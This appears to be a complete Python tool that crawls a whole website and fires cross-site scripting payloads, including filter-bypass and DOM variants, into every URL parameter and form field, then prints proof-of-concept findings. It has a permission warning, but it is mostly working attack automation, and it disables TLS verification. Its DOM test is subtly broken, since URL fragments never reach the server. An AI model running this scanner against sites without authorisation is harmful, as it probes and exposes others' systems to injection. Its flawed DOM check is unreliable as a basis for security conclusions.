#!/usr/bin/env python3
"""
Full-Site XSS Crawler & Scanner
────────────────────────────────────────────────────────────────────────────
• Recursively crawls an entire website (same-host only, depth-first).
• Enumerates every URL parameter and HTML form it encounters.
• Fires a carefully curated payload list covering Reflected, Stored, DOM and
  WAF-bypass XSS vectors.
• Prints a concise Proof-of-Concept (PoC) for every positive finding.

DEPENDENCIES
    pip install requests beautifulsoup4 colorama tldextract

USAGE
    python full_xss_crawl.py https://target.site
OPTIONS
    -d / --delay   Delay between HTTP requests (default 0.3 s)
    -t / --threads Parallel fetch threads (form testing stays single-threaded
                   to avoid noisy duplicate submissions)
    -v / --verbose Print every visited URL
────────────────────────────────────────────────────────────────────────────
⚠️  Run only against hosts you own or have WRITTEN permission to test! ⚠️
"""


import argparse, queue, re, threading, time
from urllib.parse import urlparse, urljoin, urlunparse, urlencode, parse_qsl
import requests, tldextract
from bs4 import BeautifulSoup as BS
from colorama import init, Fore, Style

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

# ───────────────────────── PAYLOADS ──────────────────────────────────────────
PAYLOADS = [
    '<svg/onload=alert(1)>',                     # classic
    '\'><img src=x onerror=alert(1)>',           # quote-breaker
    '<script>alert(document.domain)</script>',   # script tag
    '<details open ontoggle=confirm(1)>',        # HTML5
    '<iframe src=javascript:alert`1`>',          # URI scheme
    '<img src=x onerror=window[\'al\' + \'ert\'](1)>',  # WAF bypass
    '%3Cscript%3Ealert(1)%3C/script%3E',         # encoded
]

DOM_PAYLOADS = [
    '#<script>alert`DOMXSS`</script>',
    '#<img src=x onerror=alert(1)>',
    '#"><svg/onload=alert(1)>',
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (XSS-Scanner 1.0)"
}

lock          = threading.Lock()
visited       = set()
vulns         = []            # global list of dicts
session       = requests.Session()
session.headers.update(HEADERS)

# ───────────────────────── HELPER FUNCTIONS ─────────────────────────────────
def same_domain(start, targ):
    """True if targ URL is on the same registrable domain as start"""
    s, t = tldextract.extract(start), tldextract.extract(targ)
    return s.registered_domain == t.registered_domain

def get_soup(url):
    try:
        r = session.get(url, verify=False, timeout=10, allow_redirects=True)
        return r, BS(r.text, "html.parser")
    except Exception:
        return None, None

def reflect(payload, resp):
    return resp is not None and payload.lower() in resp.text.lower()

# ───────────────────────── CRAWLER THREAD ───────────────────────────────────
def crawler(base, q, delay, verbose):
    while True:
        try:
            url = q.get_nowait()
        except queue.Empty:
            return
        if verbose:
            print(f"{Fore.CYAN}[*] {url}")
        r, soup = get_soup(url)
        if r is None:
            q.task_done(); continue

        # enqueue same-site links
        for tag in soup.find_all(["a","link","script"], href=True):
            link = urljoin(url, tag['href'])
            if link.split('#')[0] not in visited and same_domain(base, link):
                visited.add(link); q.put(link)

        for tag in soup.find_all("form"):
            scan_form(tag, url)

        scan_url_params(url)

        scan_dom(url, r)

        q.task_done()
        if delay: time.sleep(delay)

# ───────────────────────── SCANNING ROUTINES ────────────────────────────────
def scan_url_params(url):
    """Reflected XSS via GET parameters"""
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if not qs: return
    for param in qs:
        original = qs[param]
        for p in PAYLOADS:
            qs[param] = p
            new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            try:
                resp = session.get(new_url, verify=False, timeout=10)
                if reflect(p, resp):
                    store_vuln("GET", new_url, param, p)
                    break
            except Exception:
                pass
        qs[param] = original

def scan_form(form, page_url):
    """Form XSS (tests text-like inputs)"""
    action = form.get("action") or page_url
    method = (form.get("method") or "GET").upper()
    target = urljoin(page_url, action)

    inputs = []
    for inp in form.find_all(["input","textarea"]):
        n  = inp.get("name")
        if not n: continue
        t  = (inp.get("type") or "text").lower()
        dv = inp.get("value") or ""
        inputs.append((n,t,dv))

    for p in PAYLOADS:
        data = {n: (p if t in ("text","search","email","url","textarea","") else dv)
                for n,t,dv in inputs}
        try:
            resp = (session.post if method=="POST" else session.get)(
                    target, data=data if method=="POST" else None,
                    params=data if method=="GET" else None,
                    verify=False, timeout=10)
            if reflect(p, resp):
                store_vuln(method, target, "FORM", p)
                break
        except Exception:
            pass

def scan_dom(url, resp):
    if resp is None: return
    if not any(i in resp.text.lower() for i in
               ["document.write","innerhtml","location.hash","location.search"]):
        return
    for p in DOM_PAYLOADS:
        test_url = url + p
        try:
            r = session.get(test_url, verify=False, timeout=10)
            if reflect(p.lstrip('#'), r):
                store_vuln("DOM", test_url, "#fragment", p)
                break
        except Exception:
            pass

# ───────────────────────── VULN RECORD/PRINT ────────────────────────────────
def store_vuln(vtype, url, param, payload):
    with lock:
        vulns.append({"type": vtype, "url": url, "param": param, "payload": payload})
        print(f"{Fore.GREEN}[+] {vtype}-XSS  {url}  param={param}  payload={payload}")

# ───────────────────────────── MAIN ─────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="Full-site XSS crawler / scanner")
    ap.add_argument("url", help="Root URL (include http/https)")
    ap.add_argument("-d","--delay", type=float, default=0.3, help="Request delay")
    ap.add_argument("-t","--threads", type=int, default=5, help="Crawler threads")
    ap.add_argument("-v","--verbose", action="store_true", help="Show every URL")
    args = ap.parse_args()

    root = args.url.rstrip("/")
    if not root.startswith(("http://","https://")):
        print("Provide full URL including http/https"); return

    print(f"{Fore.MAGENTA}⇒ Starting crawl & XSS scan on {root}")

    q = queue.Queue()
    visited.add(root); q.put(root)

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=crawler,
                             args=(root,q,args.delay,args.verbose), daemon=True)
        t.start(); threads.append(t)

    q.join()                 # wait for crawl to finish
    for t in threads: t.join()

    # ── SUMMARY ────────────────────────────────────────────────────────────
    print(f"\n{Style.BRIGHT}Scan finished – {len(vulns)} vulnerabilities found")
    for i,v in enumerate(vulns,1):
        print(f" {i:02d}. {v['type']} XSS  {v['url']}  param={v['param']}")
        print(f"     PoC payload ⟶  {v['payload']}")

if __name__ == "__main__":
    main()
